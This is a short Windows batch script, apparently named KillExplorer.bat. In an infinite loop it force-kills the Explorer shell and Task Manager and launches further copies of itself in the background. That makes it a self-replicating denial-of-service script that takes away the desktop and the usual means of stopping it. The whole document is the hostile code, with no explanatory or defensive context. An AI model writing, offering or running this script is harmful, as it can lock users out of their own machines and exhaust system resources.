@echo off
:loop
Taskkill /IM explorer.exe /F
Taskkill /IM Taskmgr.exe /F
start /b KillExplorer.bat
goto loop